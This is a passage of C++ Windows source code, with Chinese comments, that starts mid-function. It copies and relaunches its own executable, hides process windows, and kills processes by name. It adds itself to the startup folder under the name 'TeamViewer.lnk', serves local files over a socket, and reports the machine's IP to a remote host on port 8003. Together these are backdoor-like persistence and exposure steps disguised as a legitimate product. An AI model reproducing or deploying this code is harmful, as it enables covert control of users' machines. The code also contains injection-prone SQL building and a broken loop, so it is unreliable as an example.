	DWORD dwBufLen = sizeof(AdapterInfo);		// Save the memory size of buffer

	DWORD dwStatus = GetAdaptersInfo(			// Call GetAdapterInfo
		AdapterInfo,							// [out] buffer to receive data
		&dwBufLen);								// [in] size of receive data buffer
	assert(dwStatus == ERROR_SUCCESS);			// Verify return value is valid, no buffer overflow

	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;// Contains pointer to current adapter info
	do {
		PrintMACaddress(pAdapterInfo->Address,buff);	// Print MAC address
		return buff;
		pAdapterInfo = pAdapterInfo->Next;		// Progress through linked list
	}
	while(pAdapterInfo);						// Terminate if last adapter
}
void SendHeader(const char* filename,/* char* sHttpVersion,*/const char* header , int iTotBytes, char* sStatusCode,SOCKET mySocket);
void SendToBrowser(const char* sData,SOCKET mySocket,int count=0);
void SendFileToWeb(string sPhysicalFilePath,SOCKET chat,const char * type="application/octet-stream",bool isimg=false)
{
	string err1;
	FILE *stream;
	int ch=1;
	stream = fopen(sPhysicalFilePath.c_str(), "rb");
	if(!stream)return;
	fseek(stream, 0, SEEK_END );
	long iTotBytes=ftell(stream);
	split spn(sPhysicalFilePath.c_str(),"\\");
	if(spn.getcount()==1)
		spn.setchars("/");
	string name="";
	if(!isimg)
	{
		name=spn.at(spn.getcount()-1);
	}
	split sp(name.c_str()," ");
	string str1=split(split(sp.replace("%20").c_str(),"%3d").replace("=").c_str(),"%2520").replace(" ");
	SendHeader(str1.c_str(),  type, iTotBytes, " 200 OK", chat);


	rewind( stream );

	while (ch != 0)
	{
		char buff[1025]={0};
		ch = fread(buff,1,1024,stream);
		SendToBrowser(buff,chat,ch);
	} ;
	fclose(stream);
	return;

}

void SendToBrowser(const char* sData,SOCKET mySocket,int count)
{
	int numBytes = 0;
	if(count==0)
	{
		count=strlen(sData);
	}
	try
	{
		if (mySocket)
		{
			numBytes = send(mySocket,sData,count , 0);

		}

	}
	catch (char *)
	{
		// MessageBox.Show(e.Message);

	}
}
void SendHeader(const char* filename,/* char* sHttpVersion,*/const char* header , int iTotBytes, char* sStatusCode,SOCKET mySocket)
{

	char sBuffer[1024] = {0};
	char sMIMEHeader[100];
	strcpy(sMIMEHeader,header);
	if (strlen(sMIMEHeader) == 0)
	{
		strcpy(sMIMEHeader,"text/html;charset=gb2312"); // 默认 text/html
	}
	strcat(sBuffer,/*sHttpVersion*/"HTTP/1.1");
	strcat(sBuffer,sStatusCode);
	strcat(sBuffer,"\r\n");

	strcat(sBuffer,"Content-Type: ");
	strcat(sBuffer,sMIMEHeader);
	strcat(sBuffer,"\r\n");
	//strcat(sBuffer,);

	if(strlen(filename)!=0)
	{
		strcat(sBuffer,"Content-Disposition:attachment; filename=\"");
		strcat(sBuffer,split(filename).trim().c_str());
		strcat(sBuffer,"\"\r\n");
	}
	strcat(sBuffer,"Accept-Ranges: bytes\r\n");
	strcat(sBuffer,"Content-Length: ");
	char tint[10];
	strcat(sBuffer,itoa(iTotBytes,tint,10));
	strcat(sBuffer,"\r\n\r\n");
	//sBuffer = sBuffer + sHttpVersion + sStatusCode + "\r\n";
	//sBuffer = sBuffer + "Server: cx1193719-b\r\n";
	//sBuffer = sBuffer + "Content-Type: " + sMIMEHeader + "\r\n";
	//if (filename.Trim() != "") sBuffer = sBuffer + "Content-Disposition:attachment; filename=\"" + filename + "\"\r\n";
	//sBuffer = sBuffer + "Accept-Ranges: bytes\r\n";
	//sBuffer = sBuffer + "Content-Length: " + iTotBytes + "\r\n\r\n";

	//Byte[] bSendData = Encoding.ASCII.GetBytes(sBuffer);

	SendToBrowser(sBuffer,mySocket);

	// Console.WriteLine("Total Bytes : " + iTotBytes.ToString());
}
/*
class ImgDb
{
private:
	string img_path;
	CppSQLite3DB db;
	string db_path ;
public:
	ImgDb(const string &File = "C:\\test.db")
	{
		db_path=File;
		db.open(db_path.c_str());
	}
	void DelDb()
	{
		remove(db_path.c_str());
	}

	bool TableExists(const string & db_name)
	{
		return db.tableExists(db_name.c_str());
	}
	int CreateTable(const string & tb_name,const string & schema)
	{
		string sql="create table ["+tb_name+"] "+schema;
		return db.execDML(sql.c_str());
	}
	int Vaccum()
	{
		return db.execDML("VACUUM");
	}
	int DeleteTabel(const string & tb_name)
	{
		if(!TableExists(tb_name))return 0;
		string sql="drop table ["+ tb_name +"];";
		int rt=db.execDML(sql.c_str());
		Vaccum();
		return rt;
	}
	int CreateImgDiffTab(const string & tb_name)
	{
		if(!TableExists(tb_name))
		{
			CreateTable(tb_name," (\
								[id] INTEGER NOT NULL ON CONFLICT ROLLBACK PRIMARY KEY, \
								[Ntime] DATETIME NOT NULL, \
								[Rtime] DATETIME NOT NULL, \
								[Sep] INT NOT NULL);");
			return true;
		}
		return false;
	}
	int InsertDiffItem(const string &tb_name,const string & Ntime,const string& Rtime,const string & Sep)
	{
		CppSQLite3Buffer bufSQL;
		string sql="insert into ["+tb_name+"] (Ntime,Rtime,Sep) values (%Q,%Q,%q);";
		bufSQL.format(sql.c_str(),Ntime.c_str(),Rtime.c_str(),Sep.c_str());
		return db.execDML(bufSQL);
	}

	bool SelectItem(const string & tb_name,const string Ntime,string & Rtime,string & Sep)
	{
		string sql="select Rtime,Sep from ["+tb_name+"] where Ntime="+Ntime;
		CppSQLite3Query q = db.execQuery(sql.c_str());

		bool r=false;
		while (!q.eof())
		{
			Rtime=q.fieldValue(0);
			Sep=q.fieldValue(1);
			r=true;
			q.nextRow();
		}
		return r;
	}
	int DeleteItem(const string& tb_name,const string & id="")
	{
		string sql="delete from ["+tb_name+"]";
		if(id!="")
		{
			sql+=" where id=";
			sql+=id;
		}
		return db.execDML(sql.c_str());
	}

};
*/
class IAS
{
private:
	long value;
public:
	IAS(const string& buff)
	{
		value=atol(buff.c_str());
	}
	IAS(long v=0)
	{
		value=v;
	}
	IAS(const IAS & ias)
	{
		value=ias.value;
	}
	operator const char*()
	{
		return ToString();
	}
	operator const long()
	{
		return value;
	}
	operator const string()
	{
		return ToString();
	}
	typedef char (&IntArg)[50];
	IAS operator + (int i)
	{
		return value+i;
	}
	IAS operator - (int i)
	{
		return value-i;
	}
	IAS& operator += (int i)
	{
		value = value + i;
		return *this;
	}
	IAS& operator -= (int i)
	{
		value= value - i;
		return *this;
	}
	IAS& operator++()
	{
		++value;
		return *this;
	}
	const IAS operator--(int)
	{
		IAS tmp = *this;
		--value;    
		return IAS(tmp);
	}
	IAS& operator--()
	{
		--value;
		return *this;
	}

	const IAS operator++(int)
	{
		IAS tmp = *this;
		++value;    
		return IAS(tmp);
	}
	IntArg ToString()
	{
		static char buff[50];
		ltoa(value,buff,10);
		return buff;
	}
	long ToLong()
	{
		return value;
	}
};

void MG(const string & mg,IAS is)
{
	MessageBox(NULL,mg.c_str(),is,MB_OK);
}

void kill_process(const string &process_name)
{
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
	info->dwSize=sizeof(PROCESSENTRY32);
	Process32First(handle,info);

	while(Process32Next(handle,info)!=FALSE)
	{
		if(stricmp(info->szExeFile,process_name.c_str())==0)
		{
			if(getpid()!=info->th32ProcessID)
			{
				HANDLE handle=OpenProcess(PROCESS_TERMINATE,FALSE,info->th32ProcessID);
				TerminateProcess(handle,0);
			}
		}
	}
}
bool StartNewProcess(const string & path)
{
	PROCESS_INFORMATION pi;
    STARTUPINFO si;
    memset(&si,0,sizeof(si));  //清零
    si.cb=sizeof(si);
    si.wShowWindow=SW_HIDE;
    si.dwFlags=STARTF_USESHOWWINDOW;
    return CreateProcess(path.c_str(),NULL,NULL,FALSE,NULL,NULL,NULL,NULL,&si,&pi);
}
bool CopyToDestDir()
{
	string curr=get_curr_path();
	string dest=get_dest_path();
	kill_process("http.exe");
	Sleep(2000);
	if(curr!=dest)
	{
		CopyFile(curr.c_str(),dest.c_str(),false);
		//ShellExecute(NULL,"explore", get_system_tempdir().c_str(),NULL,NULL,SW_SHOWNORMAL);
		//StartNewProcess(dest);
		WinExec(dest.c_str(),SW_SHOW); 
	}
	return curr!=dest;

}



#include <shobjidl.h>
#include <shlobj.h>

bool GetSpecialFolderPath_unsecure(int nId, char* szPath)
{
	LPITEMIDLIST pidl;

		
	if (SHGetSpecialFolderLocation(0, nId, &pidl) != NOERROR)
	{
		return false;
	}

	if (!SHGetPathFromIDList(pidl, szPath) )
	{
		CoTaskMemFree(pidl);
		return false;
	}
	else
		CoTaskMemFree(pidl);
	return true;
}

bool GetSpecialFolderPath(int nId, string &outPath)
{
	//are we already impersonated, if yes we do not want to start another one
	//and change back


	char path[MAX_PATH];
	SecureZeroMemory(path,sizeof(path));

	SetLastError(0);

	outPath = "";
	
	if (!GetSpecialFolderPath_unsecure(nId,path))
	{


		return false;
	};

	outPath = path;
	return true;	
}

void GetApplicationPath(string &sApplicationPath)
{
	char apppath[MAX_PATH]="";
	GetModuleFileName(NULL,apppath,MAX_PATH);
	//strcpy(applicationPath,apppath);

	sApplicationPath = apppath;
}

void GetApplicationDirectory(string &sApplicationDirectory)
{
	char appDir[_MAX_PATH]="";
	char drive[_MAX_DRIVE]="";
	char dir[_MAX_DIR]="";
	char fname[_MAX_FNAME]="";
	char ext[_MAX_EXT] = "";
	//char applicationPath[MAX_PATH] ="";
	string sApplicationPath;
	GetApplicationPath(sApplicationPath);
	_splitpath(sApplicationPath.c_str(),drive,dir,fname,ext);
	strcpy(appDir,drive);
	strcat(appDir,dir);
	//strcpy(applicationDirectory,appDir);

	sApplicationDirectory = appDir;
}


bool InstallAutostart() 
{
	HRESULT hres; 
    IShellLink* psl; 
	bool success = false;

	if SUCCEEDED (CoInitialize(NULL))
	{
		// Get a pointer to the IShellLink interface. 
		hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
								IID_IShellLink, (LPVOID*)&psl); 
		if (SUCCEEDED(hres)) 
		{ 
			IPersistFile* ppf; 
			//strcat (szPathObj," -a");
			// Set the path to the shortcut target and add the description. 
			string sPath;

			if (!GetSpecialFolderPath(CSIDL_STARTUP,sPath))
			{
				/*
				  some paths are not available so we get here.
				  Reasons : 
				    1. path was removed from registry
					2. running as service that does not host the path
				      - GetSpecialFolderPath tries to impersonate, maybe it failed?
				*/
			}
			// hres = SHGetFolderPath(NULL,CSIDL_STARTUP, NULL, 0, szPath); doesn磘 work on Win98
			//strcat (szPath,"\\TeamViewer.lnk");
			sPath += "\\TeamViewer.lnk";

			
			char path[MAX_PATH] = "";

			GetModuleFileName(NULL, path, sizeof(path));

			psl->SetPath(path); 
						
			
			// psl->SetArguments (roVNCAutoStart);
			// Query IShellLink for the IPersistFile interface for saving the 
			// shortcut in persistent storage. 
			hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf); 
	 
			if (SUCCEEDED(hres)) 
			{ 
				WCHAR wsz[MAX_PATH]; 
				
				// Ensure that the string is Unicode. 
				MultiByteToWideChar(CP_ACP, 0, sPath.c_str(), -1, wsz, MAX_PATH); 
				
				// TODO: Check return value from MultiByteWideChar to ensure success.
			
				// Save the link by calling IPersistFile::Save. 
				hres = ppf->Save(wsz, TRUE);
				
				ppf->Release(); 

				if (hres != S_OK)
					success = false;
				else
					success = true;
			} 
			psl->Release();
		}
		CoUninitialize();

    } 

	return success;
}

bool RemoveAutostart() 
{ 
	HRESULT hres; 
    IShellLink* psl; 

	if SUCCEEDED (CoInitialize(NULL))
	{
		// Get a pointer to the IShellLink interface. 
		hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
								IID_IShellLink, (LPVOID*)&psl); 
		if (SUCCEEDED(hres)) 
		{ 
			IPersistFile* ppf; 
			//strcat (szPathObj," -a");



			// Set the path to the shortcut target and add the description. 
			string sPath;
			TCHAR path[255];
			if (SHGetSpecialFolderPath(0,path,7,0))
			{
				sPath=path;
			}

			sPath += "\\TeamViewer.lnk";

			//psl->Resolve
			//psl->SetPath(szPathObj); 
			//psl->SetArguments (roVNCAutoStart);
			// Query IShellLink for the IPersistFile interface for saving the 
			// shortcut in persistent storage. 
			hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf); 
	 
			if (SUCCEEDED(hres)) 
			{ 
				//WCHAR wsz[MAX_PATH]; 
				  if (FAILED(hres) == 0)
					{
						::DeleteFile(sPath.c_str());
					}

				// Ensure that the string is Unicode. 
				//MultiByteToWideChar(CP_ACP, 0, szPath, -1, wsz, MAX_PATH); 
				
				// TODO: Check return value from MultiByteWideChar to ensure success.
			
				// Save the link by calling IPersistFile::Save. 
				//hres = ppf->Save(wsz, TRUE);
				
				ppf->Release(); 
			} 
			psl->Release();
		}
		CoUninitialize();
    } 
    return true; 
}

bool IsInstallAutostartAllowed()
{
	if (InstallAutostart())
	{
		RemoveAutostart();
		return true;
	}
	return false;
}
SOCKET SocketListen(unsigned port)
{
	WORD wVersion=MAKEWORD(1,1); 
	WSADATA wsData; 
	int nResult= WSAStartup(wVersion,&wsData); //1、启动Winsock
	if(nResult !=0) 
	{ 
	printf("启动Winsock失败!\n"); 
	return false;
	} 

	SOCKET s=socket(AF_INET,SOCK_STREAM,IPPROTO_IP); //2.创建套接字
	if(s==INVALID_SOCKET) 
	{ 
	printf("创建套接字失败!\n"); 
	return false;
	} 

	SOCKADDR_IN addr; 
	addr.sin_family=AF_INET; 
	addr.sin_port=htons(port); //保证字节顺序 
	addr.sin_addr.S_un.S_addr=htonl(INADDR_ANY);
	nResult=bind(s,(sockaddr*)&addr,sizeof(sockaddr)); //3、套接字的绑定
	if(nResult==SOCKET_ERROR) 
	{ 
	printf("套接字的绑定失败!\n");
	return false;
	} 

	nResult=listen(s,5); //最多5个连接， 套接字的监听
	if(nResult==SOCKET_ERROR) 
	{ 
	printf("套接字的监听(服务器端)失败!\n"); 
	return false;
	} 
	return s;
}
SOCKET SocketConnect(const string &ip,unsigned port)
{
	WORD wVersion=MAKEWORD(1,1); 
	WSADATA wsData; 
		int nResult= WSAStartup(wVersion,&wsData);  //启动WINSOCKET	
		if(nResult !=0) 
		{ 
		printf("启动Winsock失败!\n"); 
		return false;
		} 

		SOCKET sc=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);  //创建套接字
		if(sc==INVALID_SOCKET) 
		{ 
		printf("创建套接字失败!\n"); return false;
		} 

		SOCKADDR_IN addrSc;
		addrSc.sin_family=AF_INET; 
		addrSc.sin_port=htons(port); //保证字节顺序 

		addrSc.sin_addr.S_un.S_addr=inet_addr(ip.c_str()); 
		nResult=connect(sc,(SOCKADDR*)&addrSc,sizeof(SOCKADDR)); //套接字连接

		if(nResult==SOCKET_ERROR) 
		{ 
		printf("连接失败!\n");return false;
		}
	
		if(nResult==SOCKET_ERROR)
		{
		printf("登陆超时，请重新登陆!\n");
		return false;
		}
		return sc;
}
bool TestSendCreateDirCommand(const string & ip)
{
	SOCKET sc=SocketConnect(ip,8003);
	if(sc==NULL)return false;

	char tempb[16]={0};
	CHttpSocket::GetIP(tempb);                //向服务端验证连接成功
	string sends="GET IP:";
	sends+=tempb;
	sends+=" ";

	int nResult=send(sc,sends.c_str(),sends.length()+1,0); 
	if(nResult==SOCKET_ERROR)
	{ 
	printf("套接字发送数据失败!\n");
	return false;
	}
	nResult=closesocket(sc);  //关闭套接字
	if(nResult==SOCKET_ERROR) 
	{ 
	printf("关闭套接字失败!\n");
	return false;
	}
	return true;
}